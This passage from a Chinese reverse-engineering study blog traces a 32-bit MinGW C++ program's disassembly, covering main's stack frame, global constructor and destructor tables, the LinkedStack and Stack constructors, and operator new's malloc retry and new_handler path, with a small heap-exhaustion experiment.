envp            = dword ptr  10h</span><br><span class="line">.text:00401530</span><br><span class="line">.text:00401530                 lea     ecx, [esp+4]</span><br><span class="line">.text:00401534                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:00401537                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0040153A                 push    ebp</span><br><span class="line">.text:0040153B                 mov     ebp, esp</span><br><span class="line">.text:0040153D                 push    ecx</span><br><span class="line">.text:0040153E                 sub     esp, 24h</span><br></pre></td></tr></table></figure>
<p>main函数刚开始时,esp指向<code>0077FEDC</code>,用OD观察这个位置,是主线程的堆栈</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726180155902.png"
alt="image-20220726180155902" />
<figcaption aria-hidden="true">image-20220726180155902</figcaption>
</figure>
<p>主线程的堆栈起于0x77E000,大小是0x2000即8K</p>
<p>由于堆栈倒着生长,因此栈底在0x780000,此时栈顶在0x0077FEDC,方向是0x780000-&gt;0x77E000</p>
<p>距离栈底0x780000-0x77FEDC=0x124即292字节</p>
<p>但是这时候主函数才是刚开始啊,也只有主函数的三个参数压栈了啊,怎么就已经使用了292个字节这么大呢?</p>
<p>主函数不是程序的入口点,在主函数执行前还有其他函数要执行,也可能占用线程栈</p>
<blockquote>
<p>PE头-&gt;NT头-&gt;可选头-&gt;AddressOfEntryPoint</p>
<p>其RVA是0x14C0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726170200724.png"
alt="image-20220726170200724" />
<figcaption aria-hidden="true">image-20220726170200724</figcaption>
</figure>
<p>而ImageBase是0x400000</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726170228334.png"
alt="image-20220726170228334" />
<figcaption aria-hidden="true">image-20220726170228334</figcaption>
</figure>
<p>加起来得到入口点的虚拟地址为<code>0x4014C0</code></p>
</blockquote>
<h5 id="lea-ecx-esp4"><code>lea     ecx, [esp+4]</code></h5>
<p>将要执行此条指令时,esp=0x77FEDC,</p>
<p>此时栈中是啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0077FEDC  00401386  ___tmainCRTStartup+226</span><br><span class="line">0077FEE0  00000001  </span><br><span class="line">0077FEE4  00CA1650  debug034:00CA1650</span><br><span class="line">0077FEE8  00CA22B8  debug034:00CA22B8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>栈顶<code>0077FEDC</code>存放的是主函数的返回地址,这个地址在<code>___tmainCRTStartu</code>函数中</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0040136C mov     [esp+90h+lpreserved], eax ; envp</span><br><span class="line">.text:00401370 mov     eax, ds:_argv</span><br><span class="line">.text:00401375 mov     [esp+90h+dwReason], eax ; argv</span><br><span class="line">.text:00401379 mov     eax, ds:_argc</span><br><span class="line">.text:0040137E mov     [esp+90h+dwMilliseconds], eax ; argc</span><br><span class="line">.text:00401381 call    _main</span><br><span class="line">.text:00401386 mov     ecx, ds:_managedapp</span><br></pre></td></tr></table></figure>
<p>显然这个返回地址是<code>call _main</code>函数压入栈中的</p>
</blockquote>
<p>栈顶再往下四个字节,0077FEE0上是1,是main函数的第一个参数<code>int argc</code>,4个字节</p>
<p>再往下四个字节0077FEE4上是main函数的第二个参数,命令行参数字符串数组<code>const char **argv</code>的基地址,4个字节</p>
<p>再往下四个字节0077FEE8上市main函数的第三个参数,环境变量字符串数组<code>const char **envp</code>的基地址,4个字节</p>
<p>esp+4显然就指向main函数的第一个参数<code>int argc</code></p>
<p>加载有效地址将该参数的地址交给ecx</p>
<h5 id="and-esp-0fffffff0h"><code>and     esp, 0FFFFFFF0h</code></h5>
<p>esp低4位置零,高28位保持不变,意思是16字节对齐</p>
<p>此举只能导致esp不增,要么esp本来低位有数现在降到0,要么本来esp就是16字节对齐了,不用降为0.</p>
<p>又栈是倒着生长的,因此不用担心此举将会导致新的压栈覆盖三个参数</p>
<p>对齐的目的应该是追求效率</p>
<p>此步执行后的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0077FED0  00000002  </span><br><span class="line">0077FED4  00DB1618  debug035:00DB1618</span><br><span class="line">0077FED8  00DB1670  debug035:00DB1670</span><br><span class="line">0077FEDC  00401386  ___tmainCRTStartup+226</span><br></pre></td></tr></table></figure>
<h5
id="push-dword-ptr-ecx-4"><code>push    dword ptr [ecx-4]</code></h5>
<p>ecx在本函数的第一条指令时被置为第一个参数的地址</p>
<p>现在将ecx-4又退到main函数的返回地址</p>
<p>这里又把返回地址压栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0077FECC  00401386  ___tmainCRTStarup+226</span><br><span class="line">0077FED0  00000002  </span><br><span class="line">0077FED4  00DA1618  debug035:00DA16</span><br><span class="line">0077FED8  00DA1670  debug035:00DA16</span><br><span class="line">0077FEDC  00401386  ___tmainCRTStarup+226</span><br><span class="line">0077FEE0  00000004  </span><br><span class="line">0077FEE4  00DA1660  debug035:00DA16</span><br><span class="line">0077FEE8  00DA22B8  debug035:00DA22</span><br><span class="line">0077FEEC  00000000  </span><br></pre></td></tr></table></figure>
<p>好像把返回值和参数压了两次栈,第一次是调用者<code>___tmainCRTStarup</code>做的,第二次是main函数做的</p>
<p>为啥要搞重复建设呢?</p>
<p>推测是因为调用约定不同导致的,<code>___tmainCRTStarup</code>这个函数不是<code>cdecl</code>调用约定的,而是<code>stdcall</code>约定的</p>
<h5 id="push-ebp"><code>push    ebp</code></h5>
<p>调用者函数的帧指针ebp压栈保存,方便ebp为现在的函数服务</p>
<h5 id="mov-ebp-esp"><code>mov     ebp, esp</code></h5>
<p>ebp获得当前main函数栈顶指针拷贝</p>
<p>当前栈顶指向二次压栈的返回值地址</p>
<h5 id="push-ecx"><code>push    ecx</code></h5>
<p>ecx存放的是第一个参数的地址,现在又把他压栈,相当于这个值前后一共压栈3次</p>
<p>推测这里是保存ecx寄存器值后来再还给他</p>
<h5 id="sub-esp-24h"><code>sub     esp, 24h</code></h5>
<p>栈顶下移0x24h个字节,为main函数申请栈帧空间,一次性申请全</p>
<p>到此函数开端完毕</p>
<h4 id="main初始化">main初始化</h4>
<h5 id="call-___main"><code>call    ___main</code></h5>
<p>这个函数进行了一些初始化,它先判断是否已经初始化过了,如果初始化过了则返回</p>
<p>否则记录一下已经初始化过了,然后执行<code>___do_global_ctors</code>这个函数,推测是对全局位置的对象实例化调用构造函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726190345716.png"
alt="image-20220726190345716" />
<figcaption aria-hidden="true">image-20220726190345716</figcaption>
</figure>
<p>奇怪的是,调用函数应该使用call指令,但是<code>____main</code>中调用<code>___do_global_ctors</code>使用的是<code>jmp short</code>跳转指令,使用jmp不会参数压栈,可以认为<code>___do_global_ctors</code>不需要参数,但是返回地址也没有压栈,<code>___do_global_ctors</code>执行完毕之后,控制应该交给谁呢?</p>
<p><code>___main</code>函数如果jz跳转实现,再loc_40BC70中也是没有返回值的,但是<code>___main</code>在调用的时候已经把返回到<code>__main</code>的地址压栈,因此可以推测,<code>___do_global_ctors</code>相当于<code>___main</code>的延续,它将会返回到<code>___main</code>栈帧一开始压入的返回地址</p>
<p>这个<code>__do_global_ctors</code>干了啥呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __do_global_ctors()</span><br><span class="line">&#123;</span><br><span class="line">  func_ptr v0; <span class="comment">// ebx</span></span><br><span class="line">  func_ptr v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = __CTOR_LIST__[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( __CTOR_LIST__[<span class="number">0</span>] == (func_ptr)<span class="number">-1</span> )<span class="comment">//func_ptr是指针类型,(func_ptr)-1是将-1强制转换为指针类型,需要结合 __CTOR_LIST__[0] 来立即这里的判断条件</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v1;<span class="comment">//v0指向上一个函数指针</span></span><br><span class="line">      v1 = (func_ptr)((<span class="type">char</span> *)v1 + <span class="number">1</span>);<span class="comment">//v1后移一个单位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( __CTOR_LIST__[(_DWORD)v1] );<span class="comment">//当v1遍历完整个函数指针表时,最后一项为全0,此时while条件不满足,跳出循环</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( ; v0; v0 = (func_ptr)((<span class="type">char</span> *)v0 - <span class="number">1</span>) )<span class="comment">//v0逆序遍历整个函数指针表</span></span><br><span class="line">    __CTOR_LIST__[(_DWORD)v0]();<span class="comment">//后面加了小括号意思是当作函数执行了</span></span><br><span class="line">  atexit(__do_global_dtors);<span class="comment">//注册函数,当程序正常终止的时候,执行__do_global_dtors函数.</span></span><br><span class="line">    <span class="comment">//当程序执行到此时并不会执行执行__do_global_dtors函数,而是当整个exe程序执行完毕才会执行__do_global_dtors函数</span></span><br><span class="line">    <span class="comment">//atexit只是起到注册作用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__CTOR_LIST__</code>表是一个函数指针表</p>
<p>第零个函数指针<code>__CTOR_LIST__[0]</code>的值为<code>0xFFFFFFFFh=-1</code>,这个值总是-1,表征函数指针表的开始,并且填了第0个元素的空,使得真正的函数指针下标从1开始</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004CA335 90 90 90 90 90 90 90 90 90 90+                align 10h</span><br><span class="line">.text:004CA340                                               public ___CTOR_LIST__</span><br><span class="line">.text:004CA340                               ; func_ptr __CTOR_LIST__[]</span><br><span class="line">.text:004CA340 FF FF FF FF                   ___CTOR_LIST__  dd 0FFFFFFFFh           ; DATA XREF: ___do_global_ctors+4↑r</span><br><span class="line">.text:004CA340                                                                       ; ___do_global_ctors:loc_40BC18↑r ...</span><br><span class="line">.text:004CA344 3C 16 40 00                                   dd offset __GLOBAL__sub_I_main</span><br><span class="line">.text:004CA348 00 96 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIcEC2ERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEj</span><br><span class="line">.text:004CA34C 90 96 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIwEC2ERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEj</span><br><span class="line">.text:004CA350 60 9D 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIcEC2ERKSsj</span><br><span class="line">.text:004CA354 30 9E 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIwEC2ERKSsj</span><br><span class="line">.text:004CA358 00 9F 4C 00                                   dd offset __GLOBAL__sub_I__ZN9__gnu_cxx9__freeresEv</span><br><span class="line">.text:004CA35C 50 A2 4C 00                                   dd offset __GLOBAL__sub_I__ZSt20__throw_system_errori</span><br><span class="line">.text:004CA360 30 A3 4C 00                                   dd offset _register_frame_ctor</span><br><span class="line">.text:004CA364 00 00 00 00                                   align 8</span><br></pre></td></tr></table></figure>
<p><code>__do_global_dtors</code>干了啥呢?</p>
<p>推测是遍历了析构函数表,挨个执行每个函数指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __do_global_dtors()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*i)(<span class="type">void</span>); <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = *p_63984; i; ++p_63984 )</span><br><span class="line">  &#123;</span><br><span class="line">    i();</span><br><span class="line">    i = p_63984[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>p_63984</code>是指向全局析构函数表的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:004CD004 6C A3 4C 00                   _p_63984        dd offset dword_4CA36C  ; </span><br></pre></td></tr></table></figure>
<p><code>dword_4CA36C</code>就是<code>__DTOR_LIST_</code>表的基地址</p>
<p>这个表很长,怎么运作的现在不想操心</p>
<p>现在回到main函数中</p>
<h5 id="lea-eax-ebpvar_10"><code>lea     eax, [ebp+var_10]</code></h5>
<p>将栈中var_10的地址放到eax中,这里var_10作用不是狠清晰,前面都没有提到var_10,</p>
<p>可以猜测一下,主函数下面就开了一个局部的LinkedStack对象,var_10会不会是该对象呢</p>
<p>联系后面调用LinkedStack构造函数,<code>var_10</code>十有八九是该对象</p>
<h5 id="mov-ecx-eax"><code>mov     ecx, eax</code></h5>
<p>再转手交给ecx</p>
<h5
id="call-__zn11linkedstackc1ev"><code>call    __ZN11LinkedStackC1Ev</code></h5>
<p>调用LinkedStack类的构造函数</p>
<p>跟踪一下这个函数</p>
<h4
id="调用linkedstack实例化一个链栈对象">调用LinkedStack实例化一个链栈对象</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:00422334 ; Attributes: bp-based frame</span><br><span class="line">.text:00422334</span><br><span class="line">.text:00422334 ; LinkedStack *LinkedStack::LinkedStack(LinkedStack *__hidden this)</span><br><span class="line">.text:00422334 public __ZN11LinkedStackC1Ev</span><br><span class="line">.text:00422334 __ZN11LinkedStackC1Ev proc near</span><br><span class="line">.text:00422334</span><br><span class="line">.text:00422334 var_C= dword ptr -0Ch</span><br><span class="line">.text:00422334 var_4= dword ptr -4</span><br><span class="line">.text:00422334 this= dword ptr  8</span><br><span class="line">.text:00422334</span><br><span class="line">.text:00422334 push    ebp</span><br><span class="line">.text:00422335 mov     ebp, esp</span><br><span class="line">.text:00422337 push    ebx</span><br><span class="line">.text:00422338 sub     esp, 24h</span><br><span class="line">.text:0042233B mov     [ebp+var_C], ecx</span><br><span class="line">.text:0042233E mov     eax, [ebp+var_C]</span><br><span class="line">.text:00422341 mov     ecx, eax</span><br><span class="line">.text:00422343 call    __ZN5StackC2Ev  ; Stack::Stack(void)</span><br><span class="line">.text:00422348 mov     dword ptr [esp], 8 ; size_t</span><br><span class="line">.text:0042234F call    __Znwj          ; operator new(uint)</span><br><span class="line">.text:00422354 mov     ebx, eax</span><br><span class="line">.text:00422356 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0042235E mov     dword ptr [esp], 0</span><br><span class="line">.text:00422365 mov     ecx, ebx</span><br><span class="line">.text:00422367 call    __ZN10LinkedNodeC1EiPS_ ; LinkedNode::LinkedNode(int,LinkedNode*)</span><br><span class="line">.text:0042236C sub     esp, 8</span><br><span class="line">.text:0042236F mov     eax, [ebp+var_C]</span><br><span class="line">.text:00422372 mov     [eax+4], ebx</span><br><span class="line">.text:00422375 nop</span><br><span class="line">.text:00422376 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:00422379 leave</span><br><span class="line">.text:0042237A retn</span><br><span class="line">.text:0042237A __ZN11LinkedStackC1Ev endp</span><br></pre></td></tr></table></figure>
<p>ecx-&gt;var_C-&gt;eax-&gt;ecx,兜兜转转还是ecx,这就很乖,为啥要用var_C捯饬?</p>
<p>再看后面的<code>.text:00422343 call    __ZN5StackC2Ev  ; Stack::Stack(void)</code>恍然大悟</p>
<p>又要使用当前对象调用父类构造函数了,那么ecx中啃腚还是要存放当前对象</p>
<p>只不过编译器没有优化这件事了</p>
<p>跟踪一下父类构造函数Stack()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00422910 ; Attributes: bp-based frame</span><br><span class="line">.text:00422910</span><br><span class="line">.text:00422910 ; Stack *Stack::Stack(Stack *__hidden this)</span><br><span class="line">.text:00422910 public __ZN5StackC2Ev</span><br><span class="line">.text:00422910 __ZN5StackC2Ev proc near</span><br><span class="line">.text:00422910</span><br><span class="line">.text:00422910 var_4= dword ptr -4</span><br><span class="line">.text:00422910 this= dword ptr  8</span><br><span class="line">.text:00422910</span><br><span class="line">.text:00422910 push    ebp</span><br><span class="line">.text:00422911 mov     ebp, esp</span><br><span class="line">.text:00422913 sub     esp, 4</span><br><span class="line">.text:00422916 mov     [ebp+var_4], ecx</span><br><span class="line">.text:00422919 mov     eax, [ebp+var_4]</span><br><span class="line">.text:0042291C mov     dword ptr [eax], 0</span><br><span class="line">.text:00422922 nop</span><br><span class="line">.text:00422923 leave</span><br><span class="line">.text:00422924 retn</span><br><span class="line">.text:00422924 __ZN5StackC2Ev endp</span><br></pre></td></tr></table></figure>
<p>当前对象的栈中<strong>地址</strong>-&gt;ecx-&gt;var_4-&gt;eax</p>
<p>0-&gt;[eax]=当前对象=当前对象的第一个成员</p>
<p>也就是当前对象的第一个双字置0,而Stack对象的第一个成员正好是一个双字的<code>int len</code></p>
<p>因此这就做了<code>len = 0;</code>这么一件事</p>
<p>为啥要费六条汇编指令呢?这是调用约定固定的结构</p>
<p>ecx传递的当前对象的栈中地址必须先压入栈中然后eax从栈中获得该对象的地址,</p>
<p>后面使用eax寄存器相对寻址对栈上的对象进行内存读写</p>
<p>这样看直接从ecx交给eax不行吗?不需要压栈中转啊</p>
<p>显然是可以的,但是没有开启编译优化就得这样来</p>
<p><strong>回到LinkedStack()</strong></p>
<h5
id="mov-dword-ptr-esp-8-size_t"><code>mov     dword ptr [esp], 8 ; size_t</code></h5>
<p>栈顶上放一个8,貌似要调用函数了,但是很奇怪的是,后面要调用的是operator
new,它怎么会有参数呢?</p>
<p>还有就是,LinkedStack()构造函数中只有一个句柄head,没有一个int类型的局部变量,为啥现在要再栈上放一个8?</p>
<p><strong>联系后文可知,这个8将作为new开辟空间的大小Size</strong></p>
<p><strong>8临时占用了head句柄的位置,后面开出对象来之后再写回这个位置,节省了空间</strong></p>
<p>LinkedNode就两个成员变量并且都是4个字节,那么一个LinkedNode实例的大小也就是sizeof(LinkedNode)=8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> value;</span><br><span class="line">LinkedNode *next;</span><br></pre></td></tr></table></figure>
<p>因此这里把8临时放到head的位置</p>
<h5
id="call-__znwj-operator-newuint"><code>call    __Znwj          ; operator new(uint)</code></h5>
<p>调用new运算符(_Znwj这名字是真tm抽象)</p>
<p>根据源代码的逻辑,此处应该是new一个LinkedNode类实例作为链栈的附加头节点head</p>
<p>这个new干了啥呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726213033815.png"
alt="image-20220726213033815" />
<figcaption aria-hidden="true">image-20220726213033815</figcaption>
</figure>
<p>ebx是被调用者保存寄存器,也就是Znwj要维护其值前后不变</p>
<p>ebx压栈保存后被赋予新值1,然后申请了18h=24字节的栈帧空间</p>
<p><code>mov     eax, [esp+1Ch+arg_0]</code></p>
<p>这里esp=77fe50,arg_0=4</p>
<p>加起来指向77fe70,栈中这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0077FE6C  00422354  LinkedStack::LinkedStack(void)+20</span><br><span class="line">0077FE70  00000008  </span><br></pre></td></tr></table></figure>
<p>这个位置是LinkedStack函数局部变量的起始位置</p>
<blockquote>
<p>也就是刚才<code>mov     dword ptr [esp], 8 ; size_t</code>这条指令的目的位置</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LinkedStack() : Stack()</span><br><span class="line">&#123;</span><br><span class="line">    head = new LinkedNode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而LinkedStack的局部变量只有一个head</p>
<p>那么这里eax将会是head这个句柄的值,刚才已经被临时置为8表征对象大小,因此现在用ebx保存这个大小,为head的真值让路</p>
<p>再往下到<code>log_4C7F12</code>中,</p>
<p>上来就把ebx放到栈上作为Size,准备调用malloc,而ebx经过前面的分析可以得知,就是LinkedNode的大小</p>
<p>这是循环的开始,可以看到循环调用了<code>_malloc</code>函数,推测是,如果堆上申请空间失败则一直重复申请,直到申请成功</p>
<p>怎么判断的?</p>
<p>malloc的返回值用eax承载,如果申请成功则eax承载的是堆上地址,否则eax=0</p>
<p>当eax不为0则<code>jz      short loc_4C7F23</code>跳转失败,执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:004C7F1E add     esp, 18h</span><br><span class="line">.text:004C7F21 pop     ebx</span><br><span class="line">.text:004C7F22 retn</span><br></pre></td></tr></table></figure>
<p>函数就返回了,eax承载返回值</p>
<p>当eax为0则<code>jz      short loc_4C7F23</code>后面继续循环</p>
<p>继续循环并没有立刻重新调用malloc函数,而是做了一些手续,具体干了啥呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726215953952.png"
alt="image-20220726215953952" />
<figcaption aria-hidden="true">image-20220726215953952</figcaption>
</figure>
<p>下到<code>loc_4C7F23</code>中,首先调用了一个无参函数<code>get_new_handler</code></p>
<p>这个函数就干了一个事<code>mov     eax, __ZN12_GLOBAL__N_113__new_handlerE ;</code>其中<code>__ZN12_GLOBAL__N_113__new_handlerE =0</code></p>
<p><code>new_handler</code>是我们应当人为设置的函数,即使用<code>set_new_handler</code>设置的函数,作用是在operator
new中,malloc开不出堆空间时,应该执行的函数</p>
<p>显然我们之前并没有使用set_new_handler设置这么一个纠错函数,这种情况下<code>get_new_handler</code>将返回NULL</p>
<p>显然<code>__ZN12_GLOBAL__N_113__new_handlerE</code>这个值应该存放的是一个函数地址,我们没有设置<code>set_new_handler</code>当然这个位置存放的是0,这也就是<code>get_new_handler</code>返回NULL的原因</p>
<p>说他是一个函数地址,还可以在后文看出,使用<code>get_new_handler</code>之后eax理论上承载的是函数地址,程序先检查一下eax是否有效,如果有效(即非零)则直接<code>call eax</code>说明eax中就是函数地址,即<code>__ZN12_GLOBAL__N_113__new_handlerE</code>理应存放函数地址</p>
<p>如果我们调用<code>set_new_handler</code>设置过处理函数,则直接跳转<code>loc_4C7F12</code>重新调用malloc</p>
<blockquote>
<p>这可以做一个实验</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">10000000</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">set_new_handler</span>(flag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="type">int</span> *p=<span class="keyword">new</span> <span class="type">int</span>[maxn];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果堆爆了,开不出来,理应执行flag函数,而主函数中我们丧心病狂地一直索取堆空间,必然会导致堆满</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\test&gt; g++ test.cpp -O0 -o test -m32</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\test&gt; ./test</span><br><span class="line">flag&#123;dustball&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到确实执行了<code>set_new_handler</code>设置的flag函数</p>
<p>如果把main中的死循环去掉,只索要一个1e7的int数组,显然不会爆堆,此时就不会执行flag函数</p>
<p>至于堆空间有多大呢?</p>
<p>这个在PE头-&gt;NT头-&gt;附加头-&gt;SizeOfHeapReserve</p>
<p>用010editor打开<code>main.exe</code>观察这个位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726222343978.png"
alt="image-20220726222343978" />
<figcaption aria-hidden="true">image-20220726222343978</figcaption>
</figure>
<p>发现给堆预留的空间是100000h=1MB</p>
</blockquote>
<p>如果我们没有设置过处理函数,则执行<code>loc_4C7F30</code>缺省处理过程.该处理过程干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004C7F30</span><br><span class="line">.text:004C7F30 loc_4C7F30:             ; thrown_size</span><br><span class="line">.text:004C7F30 mov     [esp+1Ch+Size], 4</span><br><span class="line">.text:004C7F37 call    ___cxa_allocate_exception</span><br><span class="line">.text:004C7F3C mov     dword ptr [eax], offset off_4D8C80</span><br><span class="line">.text:004C7F42 mov     [esp+1Ch+var_14], offset __ZNSt9bad_allocD1Ev ; void (__cdecl *)(void *)</span><br><span class="line">.text:004C7F4A mov     [esp+1Ch+lptinfo], offset __ZTISt9bad_alloc ; lptinfo</span><br><span class="line">.text:004C7F52 mov     [esp+1Ch+Size], eax ; void *</span><br><span class="line">.text:004C7F55 call    ___cxa_throw</span><br><span class="line">.text:004C7F55 __Znwj endp</span><br></pre></td></tr></table></figure>
<p>这个结构并没有返回到loc_4C7F12重新尝试malloc,</p>
<p>一开始调用了<code>___cxa_allocate_exception</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726223944814.png"
alt="image-20220726223944814" />
<figcaption aria-hidden="true">image-20220726223944814</figcaption>
</figure>
<p>发生了什么事呢?先看结局,</p>
